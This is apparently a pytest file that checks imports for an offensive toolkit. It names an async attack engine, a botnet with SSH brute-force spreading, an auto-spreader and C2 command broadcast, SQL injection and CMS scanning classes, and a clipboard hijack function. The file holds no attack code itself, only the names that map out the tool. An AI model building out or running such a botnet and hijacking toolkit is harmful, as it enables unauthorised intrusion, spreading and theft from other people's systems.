import pytest

def test_import_engine():
    from engine.attack import AsyncAttackEngine
    from engine.proxy import ProxyManager
    from engine.analyzer import TargetAnalyzer

def test_import_botnet():
    from botnet.spreader import ssh_bruteforce, init_db
    from botnet.auto_spreader import AutoSpreader
    from botnet.c2 import broadcast_command

def test_import_gui():
    import tkinter as tk
    root = tk.Tk()
    from gui.app import App
    # app = App(root)  # не запускаем главный цикл
    root.destroy()

def test_import_web():
    from web_hacking import SQLInjector, CMSScanner

def test_import_utils():
    from utils.logger import Logger, log
    from utils.widgets import ToolTip
    from utils.toast import ToastManager
    from utils.clipboard_hijack import start_hijack
